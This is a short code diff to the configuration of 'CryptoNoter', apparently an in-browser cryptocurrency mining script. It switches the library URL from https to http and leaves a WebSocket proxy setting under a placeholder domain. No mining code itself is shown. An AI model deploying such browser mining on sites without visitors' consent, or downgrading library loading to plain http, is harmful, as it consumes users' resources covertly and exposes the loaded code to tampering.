@@ -1,6 +1,6 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
+    LIB_URL: "http://%CryptoNoter_domain%/lib/",
     WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]]
 };
 var Module = {
